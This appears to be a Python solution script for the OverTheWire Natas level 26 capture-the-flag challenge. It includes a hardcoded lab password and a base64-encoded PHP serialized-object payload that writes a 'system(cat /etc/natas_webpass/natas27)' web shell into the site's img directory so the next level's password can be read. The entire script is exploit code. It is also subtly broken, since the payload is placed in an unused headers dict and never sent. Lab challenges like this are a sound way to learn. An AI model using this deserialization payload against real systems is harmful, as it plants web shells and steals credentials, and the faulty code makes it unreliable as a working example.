import requests
import re
import time
import base64

def flag(url,username,password,payload):
    session = requests.Session()
    site = session.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    cookie_dict = session.cookies.get_dict()
    cookie_value = cookie_dict['PHPSESSID']
    headers = {
            'PHPSESSID':cookie_value,
            'drawing':payload
            }
    session.get(url,auth=(username,password))
    flag = session.get(url + 'img/hacked.php', auth=(username,password))
    print("\nThe flag for natas26 is: " + flag.text[0:32].strip())

def message(url,username,password):
    print("Can't do PHP serialization in Python")
    time.sleep(2)
    print("\nThis is the payload that goes in the drawing cookie:")
    payload = "Tzo2OiJMb2dnZXIiOjM6e3M6NzoiaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czo3OiJleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czo3OiJsb2dGaWxlIjtzOjM3OiIvdmFyL3d3dy9uYXRhcy9uYXRhczI2L2ltZy9oYWNrZWQucGhwIjt9"
    print(payload)
    time.sleep(2)
    print("\nThis is the decoded payload")
    
    base64_string = payload
    base64_bytes = base64_string.encode("ascii")  
    decoded_string_bytes = base64.b64decode(base64_bytes)
    decoded_string = decoded_string_bytes.decode("ascii")
    
    print(decoded_string)
    time.sleep(1)
    flag(url,username,password,payload) 

if __name__=="__main__":
    url = "http://natas26.natas.labs.overthewire.org/"
    username = "natas26"
    password = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
    message(url,username,password)